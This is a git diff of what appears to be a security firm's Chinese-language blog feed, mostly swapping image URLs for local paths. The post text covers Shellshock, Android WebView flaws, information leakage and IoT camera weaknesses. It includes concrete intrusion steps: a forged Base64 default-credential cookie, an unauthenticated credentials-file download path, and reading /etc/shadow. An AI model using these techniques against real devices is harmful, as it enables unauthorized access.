-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-dPPY-uFkRM4/VK-iybc3oNI/AAAAAAAAAvs/XBpigkmx0MY/w756-h482-no/kham_login_2.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-dPPY-uFkRM4/VK-iybc3oNI/AAAAAAAAAvs/XBpigkmx0MY/w756-h482-no/kham_login_2.png&quot; alt=&quot;寬宏售票登入頁面2&quot; title=&quot;寬宏售票登入頁面2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_2.png&quot; alt=&quot;寬宏售票登入頁面2&quot; title=&quot;寬宏售票登入頁面2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;就很有可能會增加攻擊的力道。上面這種登入頁面就是就是一種常見的資訊洩漏，在今年台灣駭客年會的議程－「&lt;a href=&quot;http://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/&quot;&gt;被遺忘的資訊洩漏&lt;/a&gt;」就提及了這類資訊洩漏在台灣是很普及的。注意，出現這樣的頁面並不意味著網站會有漏洞，只是網站容易因此多受到一些攻擊。反之，如果一個網站前端頁面寫的乾淨漂亮，甚至連 &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP 安全 header&lt;/a&gt; 這種小細節都會注意到，駭客可能就會認為這個網站寫的很嚴謹，甚至連嘗試的慾望都沒有了。&lt;/p&gt;
+&lt;p&gt;就很有可能會增加攻擊的力道。上面這種登入頁面就是就是一種常見的資訊洩漏，在今年台灣駭客年會的議程－「&lt;a href=&quot;https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/&quot;&gt;被遺忘的資訊洩漏&lt;/a&gt;」就提及了這類資訊洩漏在台灣是很普及的。注意，出現這樣的頁面並不意味著網站會有漏洞，只是網站容易因此多受到一些攻擊。反之，如果一個網站前端頁面寫的乾淨漂亮，甚至連 &lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP 安全 header&lt;/a&gt; 這種小細節都會注意到，駭客可能就會認為這個網站寫的很嚴謹，甚至連嘗試的慾望都沒有了。&lt;/p&gt;
 
 &lt;p&gt;一個經驗豐富的駭客，通常光看首頁就能夠判斷該網站是否可能存有漏洞，憑藉的就是這些蛛絲馬跡。為了不讓自家網站常被路過的惡意使用者攻擊，加強網頁前端的呈現、網頁原始碼乾淨有架構、沒有太多資訊洩漏，這些都是很好的防禦方法。&lt;/p&gt;
 
@@ -4223,7 +4504,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;除了 “searchBoxJavaBridge_” 外，還有兩個介面會在特定情況下被加到 WebView 中。若使用者有在手機上 [系統設定] 裡的 [協助工具]，打開 [服務] 子分類中的任何一個項目，系統就會對其後建立的 WebView 自動加上 “accessibility” 和 “accessibilityTraversal”這兩個介面。這行為在 Android 4.4 由於&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/94c0057d67c2e0a4b88a4f735388639210260d0e&quot;&gt;舊版 WebView 被取代&lt;/a&gt;而消失了。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-JOttiWUazYQ/VDwYQnYdK9I/AAAAAAAAAts/Bmfp29QdqCY/w277-h492-no/android_accessibility_service.png&quot; alt=&quot;Android 協助工具服務&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_accessibility_service.png&quot; alt=&quot;Android 協助工具服務&quot; /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;防範&quot;&gt;防範&lt;/h4&gt;
 
@@ -4244,7 +4525,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
   &lt;li&gt;勿在受影響的系統上使用機敏服務或儲存機敏資料&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-4jQ2fAT2JXc/VDwYNA824HI/AAAAAAAAAtg/bF4CIHm5v9M/w295-h492-no/android_unknown_source.png&quot; alt=&quot;Android 不明的來源&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_unknown_source.png&quot; alt=&quot;Android 不明的來源&quot; /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;2-繞過同源策略-same-origin-policy-bypass&quot;&gt;2. 繞過同源策略 (Same-Origin Policy bypass)&lt;/h4&gt;
 
@@ -4331,7 +4612,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
    <link href="https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/"/>
    <updated>2014-09-30T00:00:00+08:00</updated>
    <id>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271</id>
-   <content type="html">&lt;p&gt;自 9/24 以來，不少資訊圈朋友日以繼夜的忙碌，這都多虧了藏在 Bash 裡 22 年的安全漏洞－&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)。對於惡意攻擊者而言，這是今年來第二波淘金潮，相較於上次 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限，也難怪 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; 給予 Shellshock 最嚴重的 10.0 分影響等級。&lt;/p&gt;
+   <content type="html">&lt;p&gt;自 9/24 以來，不少資訊圈朋友日以繼夜的忙碌，這都多虧了藏在 Bash 裡 22 年的安全漏洞－&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)。對於惡意攻擊者而言，這是今年來第二波淘金潮，相較於上次 &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限，也難怪 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; 給予 Shellshock 最嚴重的 10.0 分影響等級。&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
@@ -4413,7 +4694,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;利用同樣的道理，惡意攻擊者開始在 HTTP 表頭中置入惡意的語法，大量去掃描網路上的 CGI 網頁，因為這種網頁常呼叫系統指令，所以成功機率都頗高，攻擊成功的結果如下圖，從這張圖也可了解這個弱點可以簡單地透過一個參數就能直接讓系統執行任意指令。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-QY_2lmgtmlQ/VCrMKHc21KI/AAAAAAAAAsM/Dj4HSgIOOKU/w878-h626-no/shellshock_cgi2.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-QY_2lmgtmlQ/VCrMKHc21KI/AAAAAAAAAsM/Dj4HSgIOOKU/w878-h626-no/shellshock_cgi2.png&quot; alt=&quot;攻擊使用 CGI 的網頁伺服器&quot; title=&quot;攻擊使用 CGI 的網頁伺服器&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot; alt=&quot;攻擊使用 CGI 的網頁伺服器&quot; title=&quot;攻擊使用 CGI 的網頁伺服器&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;詳細的實作流程請參考下面影片：&lt;/p&gt;
 
@@ -4548,7 +4829,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 &lt;p&gt;Shellshock 也常被利用來繞過伺服器的 shell 限制，最常見的就是 Git 和 Subversion 伺服器：&lt;br /&gt;
 通常這些伺服器允許透過 SSH 連線，但登入後都對應著受限制的 shell。透過此漏洞，可以繞過 shell 的限制，執行指令如下圖。（註：OS 中 git user 預設 shell 要為 bash 才會受到影響）&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-6fJsJ1BkK6c/VCrMAm9n57I/AAAAAAAAAsE/ovEnfiijQ-g/w878-h530-no/shellshock_test_git.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-6fJsJ1BkK6c/VCrMAm9n57I/AAAAAAAAAsE/ovEnfiijQ-g/w878-h530-no/shellshock_test_git.png&quot; alt=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; title=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot; alt=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; title=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;一般我們要實作特定使用者登入 ssh 只能做特定的事情，常常會在 sshd_config 設定 ForceCommand，或是在 authorized_keys 設定 command= 如下：&lt;/p&gt;
 
@@ -4640,27 +4921,27 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
   &lt;li&gt;
     &lt;p&gt;某國外 V 牌廠商 （數量：320+）&lt;/p&gt;
 
-    &lt;p&gt;一般的產品通常都會有預設帳號密碼，但這間廠商的產品似乎沒有預設帳號密碼，若使用者未設定帳號密碼，攻擊者只要直接點「OK」按鈕就可以登入系統，而這樣子的 DVR 在台灣有三百多台，也就是有三百多台 DVR 在網路上裸奔…&lt;a href=&quot;https://lh6.googleusercontent.com/-K8pb-2R9Esk/VCKX3IJzzMI/AAAAAAAAAqU/w80wIMGjG_Y/w145-h177-no/case_study_01.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-K8pb-2R9Esk/VCKX3IJzzMI/AAAAAAAAAqU/w80wIMGjG_Y/w145-h177-no/case_study_01.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 1&quot; title=&quot;網路攝影機、DVR、NVR 案例 1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;一般的產品通常都會有預設帳號密碼，但這間廠商的產品似乎沒有預設帳號密碼，若使用者未設定帳號密碼，攻擊者只要直接點「OK」按鈕就可以登入系統，而這樣子的 DVR 在台灣有三百多台，也就是有三百多台 DVR 在網路上裸奔…&lt;a href=&quot;/assets/img/blog/20140924/case_study_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_01.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 1&quot; title=&quot;網路攝影機、DVR、NVR 案例 1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;某國外 H 牌廠商 （數量：1200+）&lt;/p&gt;
 
-    &lt;p&gt;有些廠商為了方便維修或者其他理由，會在 NVR 上開啟了 Telnet 服務，雖然增加了被攻擊的機率，但是若密碼強度足夠且沒有外流，也不會隨便被打進去。而這間廠商非常有趣，除了 root 帳號之外還有一組 guest 帳號，並且 guest 的密碼非常簡單，加上當初建置系統時並未檢查機敏檔案的權限是否設定錯誤，導致攻擊者可先用 guest 帳號登入，再去 /etc/shadow 讀取 root 密碼加以破解，進一步取得設備所有權限。&lt;a href=&quot;https://lh3.googleusercontent.com/-LpCdEr9_Oh4/VCKoLA8lr9I/AAAAAAAAArs/cfkenPnECAU/w1267-h916-no/case_study_02.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-LpCdEr9_Oh4/VCKoLA8lr9I/AAAAAAAAArs/cfkenPnECAU/w1267-h916-no/case_study_02.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 2&quot; title=&quot;網路攝影機、DVR、NVR 案例 2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;有些廠商為了方便維修或者其他理由，會在 NVR 上開啟了 Telnet 服務，雖然增加了被攻擊的機率，但是若密碼強度足夠且沒有外流，也不會隨便被打進去。而這間廠商非常有趣，除了 root 帳號之外還有一組 guest 帳號，並且 guest 的密碼非常簡單，加上當初建置系統時並未檢查機敏檔案的權限是否設定錯誤，導致攻擊者可先用 guest 帳號登入，再去 /etc/shadow 讀取 root 密碼加以破解，進一步取得設備所有權限。&lt;a href=&quot;/assets/img/blog/20140924/case_study_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_02.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 2&quot; title=&quot;網路攝影機、DVR、NVR 案例 2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;某國外 D 牌廠商 （數量：700+）&lt;/p&gt;
 
-    &lt;p&gt;這個案例實在是令人哭笑不得，不知道是原廠還是台灣代理商非常好心地幫使用者建立了多組預設帳號，包含 admin、666666、888888 等等，而且密碼也設定得很簡單。但是通常要使用者記得改一組預設密碼已經非常困難，更何況是要使用者改三組密碼呢？這種情形導致攻擊者可以輕而易舉地拿著弱密碼到處猜，大大提高了用戶的受害機率。而更有趣的是，不知道是基於歷史包袱或者其他原因，此設備開了特殊的 port，直接送出含有特定內容的封包到這個 port 就可以執行相對應的指令，例如可以取得帳號密碼、使用者 email 等等，而在這個過程中完全沒有任何認證機制！等於又有七百多台 NVR 在網路上裸奔…&lt;a href=&quot;https://lh6.googleusercontent.com/-A5ocSnssMig/VCKoLCSYHII/AAAAAAAAAro/Cwx5ctzeeXs/w1267-h916-no/case_study_03.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-A5ocSnssMig/VCKoLCSYHII/AAAAAAAAAro/Cwx5ctzeeXs/w1267-h916-no/case_study_03.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 3&quot; title=&quot;網路攝影機、DVR、NVR 案例 3&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;這個案例實在是令人哭笑不得，不知道是原廠還是台灣代理商非常好心地幫使用者建立了多組預設帳號，包含 admin、666666、888888 等等，而且密碼也設定得很簡單。但是通常要使用者記得改一組預設密碼已經非常困難，更何況是要使用者改三組密碼呢？這種情形導致攻擊者可以輕而易舉地拿著弱密碼到處猜，大大提高了用戶的受害機率。而更有趣的是，不知道是基於歷史包袱或者其他原因，此設備開了特殊的 port，直接送出含有特定內容的封包到這個 port 就可以執行相對應的指令，例如可以取得帳號密碼、使用者 email 等等，而在這個過程中完全沒有任何認證機制！等於又有七百多台 NVR 在網路上裸奔…&lt;a href=&quot;/assets/img/blog/20140924/case_study_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_03.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 3&quot; title=&quot;網路攝影機、DVR、NVR 案例 3&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;某國內 A 牌廠商 （數量：1000+）&lt;/p&gt;
 
-    &lt;p&gt;這間廠商也是使用常見的預設帳號密碼，但它可怕的地方還不止於此。該系統將帳號密碼轉為 Base64 編碼後直接當作 cookie 內容，因此若預設帳號密碼分別是 abc 與 123，將 abc:123 用 Base64 編碼過後可得到 YWJjOjEyMw==，接著將 Cookie: SSID=YWJjOjEyMw== 這串內容加到 request 的 HTTP header 中，就可以到處測試該設備是否使用預設帳號密碼，甚至還可以進一步下載備份檔，察看使用者有無填寫 email、網路帳號密碼等資料。&lt;a href=&quot;https://lh3.googleusercontent.com/-27vJx4_3nnQ/VCKfq9vZh_I/AAAAAAAAArA/A6qo8XpzryI/w1132-h622-no/case_study_04.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-27vJx4_3nnQ/VCKfq9vZh_I/AAAAAAAAArA/A6qo8XpzryI/w1132-h622-no/case_study_04.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 4&quot; title=&quot;網路攝影機、DVR、NVR 案例 4&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;這間廠商也是使用常見的預設帳號密碼，但它可怕的地方還不止於此。該系統將帳號密碼轉為 Base64 編碼後直接當作 cookie 內容，因此若預設帳號密碼分別是 abc 與 123，將 abc:123 用 Base64 編碼過後可得到 YWJjOjEyMw==，接著將 Cookie: SSID=YWJjOjEyMw== 這串內容加到 request 的 HTTP header 中，就可以到處測試該設備是否使用預設帳號密碼，甚至還可以進一步下載備份檔，察看使用者有無填寫 email、網路帳號密碼等資料。&lt;a href=&quot;/assets/img/blog/20140924/case_study_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_04.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 4&quot; title=&quot;網路攝影機、DVR、NVR 案例 4&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;某國內 A 牌廠商（數量：10+）&lt;/p&gt;
 
-    &lt;p&gt;這個案例雖然數量非常少，但是卻非常嚴重。為什麼呢？因為廠商沒有對機敏資料做嚴格的權限控管，只要攻擊者直接在網址列輸入 http://IP/sys.bin，就可以直接下載一個名為 sys.bin 的檔案，而此檔案是 tgz 格式，解壓縮後可以得到 system_server.conf，該檔案中含有帳號、密碼，因此即便使用者修改了預設帳號密碼，也會因為這個嚴重漏洞而輕易地被入侵。&lt;a href=&quot;https://lh6.googleusercontent.com/-GQ3TpVeMlP4/VCKfqoFuwOI/AAAAAAAAAq4/fxfRe9BlWZA/w1132-h601-no/case_study_05.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-GQ3TpVeMlP4/VCKfqoFuwOI/AAAAAAAAAq4/fxfRe9BlWZA/w1132-h601-no/case_study_05.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 5&quot; title=&quot;網路攝影機、DVR、NVR 案例 5&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;這個案例雖然數量非常少，但是卻非常嚴重。為什麼呢？因為廠商沒有對機敏資料做嚴格的權限控管，只要攻擊者直接在網址列輸入 http://IP/sys.bin，就可以直接下載一個名為 sys.bin 的檔案，而此檔案是 tgz 格式，解壓縮後可以得到 system_server.conf，該檔案中含有帳號、密碼，因此即便使用者修改了預設帳號密碼，也會因為這個嚴重漏洞而輕易地被入侵。&lt;a href=&quot;/assets/img/blog/20140924/case_study_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_05.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 5&quot; title=&quot;網路攝影機、DVR、NVR 案例 5&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;XXXX科技 （數量：230+）&lt;/p&gt;
@@ -4749,12 +5030,12 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;為了解目前一些熱門網站是否重視這些最基本的保護，我們實際對 alexa 台灣前 525 名的網站進行資訊洩漏的調查。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-nkTDQZHfH1Y/U_xNFWwqgsI/AAAAAAAAAo0/ElXB9PWtF1s/w878-h659-no/phpmyadmin_leak.jpg&quot; alt=&quot;phpmyadmin 頁面洩漏狀況&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;https://lh4.googleusercontent.com/-To2bi4RSj-E/U_xNGVtGRrI/AAAAAAAAAo8/cIL9Gw15Yv0/w878-h659-no/phpinfo_leak.jpg&quot; alt=&quot;phpinfo 頁面洩漏狀況&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/phpmyadmin_leak.jpg&quot; alt=&quot;phpmyadmin 頁面洩漏狀況&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20140826/phpinfo_leak.jpg&quot; alt=&quot;phpinfo 頁面洩漏狀況&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;在管理介面和測試頁面洩漏的項目，我們用很保守的方式測試根目錄下是否存有 phpmyadmin 和 phpinfo 頁面，結果分別有 7% 和 9% 的網站有這樣的問題。這樣的結果非常令人訝異，畢竟受測網站都是知名且有技術力的網站，而且並非所有網站都使用 php 開發，再加上我們只是測試預設的命名，實際洩漏的情況會更多！&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-cswPNS5-A3Q/U_xNHRv8hcI/AAAAAAAAApE/7xwduuTUug8/w878-h659-no/version_control_leak.jpg&quot; alt=&quot;版本控制洩漏狀況&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/version_control_leak.jpg&quot; alt=&quot;版本控制洩漏狀況&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;另一個值得一提的是版本控管洩漏問題，我們同樣保守的只針對版本控管軟體中 GIT 和 SVN 兩項進行調查。結果竟然有 10% 的網站有這樣的問題。這個現象非常嚴重！這個現象非常嚴重！這個現象非常嚴重！這個洩漏有機會能還原整個服務的原始碼，被攻擊成功的機率相當高！台灣熱門的網站裡，十個裡面就有一個存有這樣的問題，非常危險，煩請看到這篇文章的朋友能去注意貴公司的網站是否存在這樣的問題。&lt;/p&gt;
 
@@ -4764,13 +5045,13 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;駭客擁有這樣的資料，就能夠在非常短暫的時間內篩選出有問題的主機，進行大量的入侵。我們利用類似的技術針對台灣主機快速的進行掃描，就發現了台灣有 61414 台主機可以被利用來做 DNS Amplification DDoS 攻擊、1003 台主機可以被利用來做 NTP Amplification DDoS 攻擊。也就是說，駭客可以在短時間內組織一支六萬多人的台灣大軍，可以針對他想要攻擊的目標進行攻擊。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-BBzmwDTmrtk/U_xPpzBhcnI/AAAAAAAAApY/OtleTlTFIrA/w878-h659-no/heartbleed.jpg&quot; alt=&quot;OpenSSL Heartbleed 尚未修復的狀況&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/heartbleed.jpg&quot; alt=&quot;OpenSSL Heartbleed 尚未修復的狀況&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;利用相同的技術，我們也順便檢驗了前陣子非常熱門的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 問題。OpenSSL Heartbleed 被稱之為『近十年網路最嚴重的安全漏洞』，其嚴重程度可以想見，然而根據我們的觀察，台灣至今仍有 1480 台 HTTP 伺服器尚未修復，而台灣前 525 大熱門網站中，也有 21 個(4%)網站未修復。足見台灣網站對於資安的意識仍然不夠。&lt;/p&gt;
 
 &lt;p&gt;對於這樣海量收集資料衍生的資安議題，我們認為最大的受害者，是物聯網的使用者！就我們的觀察，物聯網的設備通常安全防護不佳，容易遭受到駭客攻擊，前陣子 &lt;a href=&quot;http://www8.hp.com/us/en/hp-news/press-release.html?id=1744676&quot;&gt;HP 也出了一份報告指出&lt;/a&gt;，物聯網的設備有七成存在弱點，而且每台設備平均有 25 個弱點。除此之外，物聯網的設備不易更新，少有人會定期更新，更導致物聯網設備可以被大範圍的攻擊，進而滲透家用網路，危害使用者居家隱私。這是個未來需要持續關注的重要議題。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-2Cj8HGgmtHs/U_xPqgVi1CI/AAAAAAAAApg/YpZkYboUk24/w878-h659-no/synolocker.jpg&quot; alt=&quot;仍暴露在 SynoLocker 風險狀況統計&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/synolocker.jpg&quot; alt=&quot;仍暴露在 SynoLocker 風險狀況統計&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;最後，我們用最近 SynoLocker 的案例為大數據資料蒐集作結，SynoLocker 是一款針對 Synology 的勒索軟體，去年底 Synology 官方已經推出新版修正問題，本月 SynoLocker 擴散至全世界，新聞一再強調需要更新 NAS，但我們針對台灣 1812 台對外開放的 Synology NAS 做統計，至今仍發現有 64％ 的使用者沒有更新，也就是這些 NAS 仍暴露在 SynoLocker 的風險中。這件事情又再次證明駭客有能力在短時間利用大數據資料找到攻擊目標，也順帶說明了台灣資安意識普遍不足的問題。&lt;/p&gt;
 
@@ -4793,7 +5074,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
    <content type="html">&lt;p&gt;在網路上傳輸敏感資訊時，通常會使用 HTTPS 協定，讓客戶端與伺服器端對資料進行 SSL 加密處理，以降低資料在傳輸過程中被監聽或中間人攻擊的風險。HTTPS 的重要性逐漸被重視，Google 除了預設開啟 HTTPS 之外，未來更會將 &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS 的網站搜尋排名加分&lt;/a&gt;。但為了確保傳輸的安全，過程中客戶端會核對伺服器的憑證鏈 (certificate chain) 是否有效，若判定為無效時會作出警告。(詳見&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;
 
 &lt;!-- more --&gt;
-&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-3KUlB8qAxng/U-oq77eBmvI/AAAAAAAAAlw/Ul4v9jNaSXY/w846-h577-no/desktop_browser_insecure_warning.png&quot; alt=&quot;Desktop 警告圖&quot; /&gt;&lt;br /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/desktop_browser_insecure_warning.png&quot; alt=&quot;Desktop 警告圖&quot; /&gt;&lt;br /&gt;
 而在手機應用程式上 HTTPS 同樣重要，例如網路銀行、線上購物等。系統同樣會做憑證核對，但對被判定為無效的憑證就需要開發者作出額外的處理了。許多手機應用程式開發商在這個部分並沒有妥善處理好，以下我們就幾個常見的成因做基本的探討。&lt;/p&gt;
 
 &lt;h3 id=&quot;會被系統判定為無效的常見成因&quot;&gt;會被系統判定為無效的常見成因？&lt;/h3&gt;
@@ -4805,8 +5086,8 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 &lt;h4 id=&quot;2-相關憑證未被預載到系統中&quot;&gt;2. 相關憑證未被預載到系統中&lt;/h4&gt;
 &lt;p&gt;以 GCA 簽發的 SSL 憑證為例，在 Windows 上被判定為有效，但在 iOS 系統上卻因為 CA 不在系統的預載清單中而被判定為無效。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-1Aeo7DIPjMg/U-o1hpl5ZTI/AAAAAAAAAmk/jodyNvjqpTs/w741-h654-no/windows_recognize_gca.png&quot; alt=&quot;Windows&quot; /&gt;&lt;br /&gt;
-&lt;img src=&quot;https://lh4.googleusercontent.com/kXM1zDdNKQitgCAvIqIkTAz8fgi_QgPA3rBb8kP49jg=w457-h686-no&quot; alt=&quot;iPhone&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/windows_recognize_gca.png&quot; alt=&quot;Windows&quot; /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20140815/iphone_unknown_ca.png&quot; alt=&quot;iPhone&quot; /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;3-使用自行簽發的憑證&quot;&gt;3. 使用自行簽發的憑證&lt;/h4&gt;
 &lt;p&gt;這種情況常出現在應用程式開發階段的內部測試環境中，由於是內部測試環境一般都不會花錢去申請憑證。&lt;/p&gt;
@@ -5068,11 +5349,11 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;以下圖為例，網站本身只允許 192.168.x.x 的網段連線，如果今天 Client IP 是 1.1.1.1，將無法存取該網站。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-83jVqsSvAXA/U8jvgKw26VI/AAAAAAAAAjU/J_ss99PvApw/s2560/2014-07-11-waf-configuration-security-issue-01.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-83jVqsSvAXA/U8jvgKw26VI/AAAAAAAAAjU/J_ss99PvApw/w566-h150-no/2014-07-11-waf-configuration-security-issue-01.png&quot; alt=&quot;限制 IP 存取&quot; title=&quot;限制 IP 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot; alt=&quot;限制 IP 存取&quot; title=&quot;限制 IP 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
